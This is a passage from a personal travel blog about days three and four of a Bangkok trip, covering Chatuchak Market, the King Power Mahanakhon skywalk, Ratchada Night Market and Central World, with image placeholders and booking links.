lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Cat magnet, there are many cats in Bangkok, and they immediately come to rub against me](/assets/b7e7c0938985/1*SE6vLh_o39-CW6fqY5E4yQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Cat magnet, there are many cats in Bangkok, and they immediately come to rub against me.I took a Grab to [Wang Chun Sheng Beef Hot Pot](https://maps.app.goo.gl/1VuwzAdKS4vH6kmj6){:target=\"_blank\"} for breakfast. The overall flavor is quite Chinese/Taiwanese, and I think it's good, but Tainan beef soup is even better.&gt; _After eating, I planned to go to Chatuchak Market, which is a bit far, so I didn't want to walk and transfer to BTS, so I took an Uber directly (THB 374)._ &gt; 👉👉👉 [**_KKday Chatuchak Market | Bangkok Private Transfer Service_**](https://www.kkday.com/zh-tw/product/182142?cid=19365){:target=\"_blank\"} #### 10:45 Arrive at Chatuchak Market![](/assets/b7e7c0938985/1*8o4nvrw_HE5jQqVj1WSXZA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![[Chatuchak Electronic Map (chatuchak market map) click here](https://www.chatuchakmarket.org/home/chatuchak-market-map-e1499274279204/#iLightbox%5Bpostimages%5D/0){:target=\"_blank\"}](/assets/b7e7c0938985/1*MbG_EQOTEj2el3qwTLq0Iw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }[Chatuchak Electronic Map (chatuchak market map) click here](https://www.chatuchakmarket.org/home/chatuchak-market-map-e1499274279204/#iLightbox%5Bpostimages%5D/0){:target=\"_blank\"}![](/assets/b7e7c0938985/1*EujKJrIG4d5FRHmUyPKAOQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*0ofswmspB9w2vM7mII57_g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Chatuchak is large, with dense vendors, but overall clean and easy to navigate. However, many items are repetitive, and it seems like a lot of them are touristy Made In China products.![](/assets/b7e7c0938985/1*GJv4mk3v2-DptRofTF_9zg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjE4NjciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }In the end, I only bought a Thai brand, Phutawan indoor diffuser, as a souvenir.![](/assets/b7e7c0938985/1*28EbS8N3OUJwSCPrgaTb8Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MTMiIGhlaWdodD0iMTE5OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Feeling tired from shopping, I walked into a massage shop for a foot massage and some shoulder and neck massage (1 hour/THB 250).#### Restroom![](/assets/b7e7c0938985/1*MWrn99rVaxx0O6wc4DS8vg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MjEiIGhlaWdodD0iMTE2NCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*tGe2u5gIF70mPz3d7sX5XQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }If you need to use the restroom at Chatuchak, there are paid restrooms outside the market (THB 5 per use). I went in, and it was very clean, with one stall per person, and they are basically cleaned all the time. If you don't want to pay, you can go to the nearby [Mixt Chatuchak](https://maps.app.goo.gl/5PwQcFThBHtFpbzw6){:target=\"_blank\"} mall, which has free and equally clean restrooms.#### [Mixt Chatuchak](https://maps.app.goo.gl/5PwQcFThBHtFpbzw6){:target=\"_blank\"}![Seafood Rice](/assets/b7e7c0938985/1*wdLS8dzkDwPURAVZB5MCdw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjgzNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Seafood RiceFor lunch, I casually solved it at a restaurant inside [Mixt Chatuchak](https://maps.app.goo.gl/5PwQcFThBHtFpbzw6){:target=\"_blank\"}, and the taste was quite good.![](/assets/b7e7c0938985/1*bQIQ8Tt0eFOFCaro6ZExyA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*LeJHthehTAM7xdrlOLhETg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After eating, I continued to shop and bought a cup of durian juice to drink, which was very rich and authentic in flavor and reasonably priced (THB 89).&gt; _Later, I found that things at Chatuchak are actually cheaper; for example, the menthol nasal sticks here sell for 6 for $99, while Big C sells 6 for $140... and the durian juice is also cheaper; it sells for over $140 at night markets in the city._ #### 15:00 Take BTS to King Power Mahanakhon![](/assets/b7e7c0938985/1*A4V3CL5XvLoQ4sp487pJuQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Chatuchak is closer to the MRT, but we are going to King Power Mahanakhon, which is at BTS Chong Nonsi station; it takes about 1 KM (15 mins) to walk from Chatuchak to the nearest BTS Saphan Khwai station.#### King Power Mahanakhon (Bangkok's King Power Mahanakhon)Ticket price: THB 1,080 per person&gt; _👉👉👉 [**It is recommended to buy tickets from KKday in advance for a better price: Bangkok King Power Mahanakhon SkyWalk Observation Deck Ticket (free cancellation 2 days in advance)**](https://www.kkday.com/zh-tw/product/20739-king-power-mahanakhon-sky-walk-bangkok-ticket?cid=19365){:target=\"_blank\"}_ ![](/assets/b7e7c0938985/1*ALDvjp2G_wvG1hgSICkCXA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*bt8Xsj_kl6sIL-SfIGBAbg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*AJADLZZvKK4E4LXvuDWkYA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MjYiIGhlaWdodD0iMTE1NSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Up close, it doesn't seem as towering as imagined, but the architectural style is very unique, more cyberpunk.You need to go through a security check before entering, and after buying the ticket, you can store your belongings for free; backpacks cannot be taken up (small waist bags are allowed).![](/assets/b7e7c0938985/1*VmtZbM-a4YXvpKKqoUDLDA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2OTIiIGhlaWdodD0iMTE5NyI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*s21JKjBu55PO3vkAfbuHtw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2OTAiIGhlaWdodD0iMTE2MSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*9YK4nDHDNa8QW8JdWUzcAw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }&gt; _Before taking the elevator, you can choose whether to take photos (the ticket includes a series of free digital photos; if you want physical photos, you need to pay extra)._ ![](/assets/b7e7c0938985/1*0-5NKdyIudRCHoGbQMG6xQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*ZIr7CLDlxnLuIcBZxoqYSQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![_Free digital photos, after the visit, staff will guide you to download them_](/assets/b7e7c0938985/1*tyRULc9fnEvUtI-uP6AS1A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }_Free digital photos, after the visit, staff will guide you to download them._The direct elevator has a 360-degree scene animation similar to Taipei 101 and Tokyo Skytree; the height is about the same as Tokyo Tower.![](/assets/b7e7c0938985/1*Ljm_PbRdwu8tszdzSJXAIQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*sP_hQ4hGSKCygeaSgltHpQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The elevator first takes you to the indoor observation deck on the 74th floor, where there is a café and public seating for a short rest. To reach the outdoor observation deck on the 78th floor, you need to take another elevator or walk up the stairs.As soon as you arrive on the 78th floor, there is a small bar where you can order a drink and enjoy the view.![](/assets/b7e7c0938985/1*UQfqlK-yyirHCGU08P7xrQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*PeqjUWSwE1Hh24qWkioTxA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9Ijk3MSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After exiting the 78th floor, you can continue up to the stairs and the top floor rest area.![](/assets/b7e7c0938985/1*ka4Pl5OQcXwptpdj6JMEPA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*f6oB_qelx6mxJQUDhyJoxQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MDQiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*dFRAU2mY_Qp9T0ru4GngIg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }From the top floor, you can enjoy a panoramic view of Bangkok, and you can imagine that the night view must be beautiful!![](/assets/b7e7c0938985/1*f4eREu0dL79OzsYCtl1O9A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*XOsqBu8PjCeB7XSlsD0_Fg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The stairs and the top floor rest area face the famous transparent glass corridor, where you can see straight down to the ground. You can grab shoe covers from the nearby box to enter, but **it is prohibited to bring your phone; you can ask your companions or staff for help with taking photos.**![](/assets/b7e7c0938985/1*9AVMpOE7sP7aJGdLbXXeFA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MDciIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*TtjAOAoGcWNI9NtNn4LVAA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MDQiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*K2MOcxsrNbuNbz00sPfNOg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MTYiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The entire glass corridor is not very large, about the size of a rooftop infinity pool at a hotel. It doesn't feel very high when viewed from the side, but actually walking on it can be a bit scary, making your legs feel weak XD### Ratchada Night Market (formerly known as Ratchada Train Night Market)![MRT can directly swipe credit cards](/assets/b7e7c0938985/1*BrfghHaJknyt6IiX7yOgbA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }You can swipe your credit card directly on the MRT.To get to Central Rama 9, you need to transfer to the MRT subway at Pharam 9 Station. The Rabbit Card cannot be used, so you need to buy a ticket or you can now use a VISA card to swipe in and out.&gt; _I tested that the Taishin GoGo card works, but I haven't tried the Cathay Cube._![](/assets/b7e7c0938985/1*TfSOFizTa2e6v08mp0L8DQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*HENvMK0DHVUKjQXlQ9AaLA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjA2IiBoZWlnaHQ9IjE1MDYiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }![](/assets/b7e7c0938985/1*c6Ug9F-JfXPzgnfvtvRvdg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }For dinner, we came here to find food. I must say that Bangkok's night markets and markets are far superior to those in Taiwan. The overall environment is clean, there are seating areas, it’s not chaotic, and it’s well-planned, making it very comfortable to stroll around.![](/assets/b7e7c0938985/1*1cBlgC7kvmt1fWeMfiDVMA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*OVMfzMU1HugpE0CVyUiSVw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After walking around, we first tried the dessert on the left (similar to egg cake?) and the savory seafood grill on the right. Both were quite good and had a nice chewy texture.![](/assets/b7e7c0938985/1*31mIDWp4WgTX8TSK5Q-C4Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*jMuzNnI8CCSLDZj4Tq9jHQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*K3ZN-Kiwz4yTiNHiZ3P1bg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Next was the highlight, the volcanic ribs, which had a very unique flavor. The sauce was a spicy and sour lemongrass flavor, and you could just put on gloves and grab them to eat. It was very appetizing!After eating, we bought coconut ice cream with mango and peanut dessert from another stall, which was also delicious!![](/assets/b7e7c0938985/1*GamIzqKB9ROnECRfhPfA1Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After eating, we went back to Central Rama 9 to take a look. There is also the famous NaRaYa Bangkok bag here.![](/assets/b7e7c0938985/1*a5BcYS64yitoccK9TTU1HQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*csaO0X3lGf2TSIb3xQ8JWg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }On the way back to the hotel, we happened to encounter Bangkok after the rain, paired with colorful digital advertising screens. The color contrast was striking, giving off a cyberpunk vibe.#### 7–11 Hot Pressed Toast Late Night Snack![](/assets/b7e7c0938985/1*Q_ZcnuANczrDSH2a_UrlpQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*xfDNDCREdA2reWLeSXb1rw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*xQi9q1iA7o6FyfAeEISTEw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }On the way back to the hotel, I tried Thailand's [convenience store hot pressed toast](https://supertaste.tvbs.com.tw/pack/347495){:target=\"_blank\"} and Thai banana milk. The filling was melted cheese with a hot dog, and the crust was flaky! It was really delicious and cheap!### 8/05 Day 4 Central World, Big C, Terminal 21&gt; **_Did not sleep well all night + hungover all day, feeling dazed._**#### Central World![](/assets/b7e7c0938985/1*8pZ3crfkb4wIqZZOoI9-zA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*6_evilQk4T0LdCYSIgBudg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }In the morning, I got up and headed out to Central World for shopping.![](/assets/b7e7c0938985/1*Sp3TTqnEx3yn6IM4H38NsQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*tmLvijY5Q7TVJbMo4D4XFg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }On the first floor, there is a SHAKE SHACK burger place. I ordered the SHAKE SHACK signature burger and the coconut milkshake flavor that is unique to Bangkok. The burger was tasty and not greasy, but I found the milkshake a bit too sweet.![](/assets/b7e7c0938985/1*OXOp4dN-5p9xS1ojcu0b9A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The 